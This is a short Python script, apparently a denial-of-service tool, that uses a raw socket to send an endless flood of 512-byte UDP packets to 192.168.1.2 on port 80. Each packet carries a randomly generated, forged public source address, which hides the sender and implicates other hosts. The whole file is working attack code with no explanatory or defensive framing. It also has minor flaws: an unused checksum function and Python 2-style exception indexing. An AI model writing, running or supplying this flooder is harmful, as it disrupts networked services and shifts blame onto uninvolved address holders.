import socket
import struct
import random

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
except socket.error as msg:
    print(f'Socket could not be created. Error Code : {str(msg[0])} Message {msg[1]}')
    exit()

def checksum(data):
    if len(data) % 2 != 0:
        data += b'\x00'
    res = sum(struct.unpack('!%sH' % (len(data) // 2), data))
    res = (res >> 16) + (res & 0xFFFF)
    res += res >> 16
    return ~res & 0xFFFF

def _1():
    while True:
        a = [str(random.randint(0, 255)) for _ in range(4)]
        ip = '.'.join(a)
        if not (a[0] == "127" or a[0] == "10" or (a[0] == "172" and 16 <= int(a[1]) <= 31) or (a[0] == "192" and a[1] == "168")):
            break
    return ip

def create_ip_header(source_ip, dest_ip):
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 0
    ip_id = random.randint(0, 65535)
    ip_frag_off = 0
    ip_ttl = 64
    ip_proto = socket.IPPROTO_UDP
    ip_check = 0
    ip_saddr = socket.inet_aton(source_ip)
    ip_daddr = socket.inet_aton(dest_ip)
    ip_ihl_ver = (ip_ver << 4) + ip_ihl
    
    ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
    return ip_header

def create_udp_header(source_port, dest_port, data):
    udp_len = 8 + len(data)
    udp_check = 0
    udp_header = struct.pack('!HHHH', source_port, dest_port, udp_len, udp_check)
    return udp_header

def create_packet(source_ip, dest_ip, source_port, dest_port, data):
    ip_header = create_ip_header(source_ip, dest_ip)
    udp_header = create_udp_header(source_port, dest_port, data)
    return ip_header + udp_header + data

source_port = 80
dest_ip = '192.168.1.2'
dest_port = 80
data = b'A' * 512

while True:
    source_ip = _1()
    packet = create_packet(source_ip, dest_ip, source_port, dest_port, data)
    sock.sendto(packet, (dest_ip, 0))